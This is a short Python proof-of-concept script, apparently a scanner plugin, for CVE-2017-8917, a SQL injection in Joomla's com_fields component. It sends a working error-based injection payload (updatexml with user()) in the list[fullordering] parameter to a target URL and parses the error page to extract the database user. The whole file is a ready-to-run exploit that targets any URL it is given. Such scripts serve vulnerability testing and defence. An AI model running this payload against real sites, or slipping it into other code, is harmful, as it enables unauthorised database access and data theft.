#!/usr/bin/python3
'''
name: CVE-2017-8917 SQL注入漏洞
description: CVE-2017-8917 SQL注入漏洞
'''

import re
from app.lib.utils.request import request


class CVE_2017_8917_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0"
        }
        self.payload = '/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)'

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            check_req = request.get(self.url + self.payload, headers = self.headers)
            if 'XPATH syntax error:' in check_req.text:
                pattern = re.compile('<span class="label label-inverse">500</span>(.*?)</blockquote>')
                cmd_result = pattern.findall(check_req.text)[0]
                print('存在CVE-2017-8917 SQL注入漏洞,结果是:', cmd_result)
                return True
            else:
                print('不存在CVE-2017-8917 SQL注入漏洞')
                return False
        except Exception as e:
            print(e)
            print('不存在CVE-2017-8917 SQL注入漏洞')
            return False
        finally:
            pass

if __name__ == '__main__':
    CVE_2017_8917 = CVE_2017_8917_BaseVerify('http://127.0.0.1:8080')
    CVE_2017_8917.run()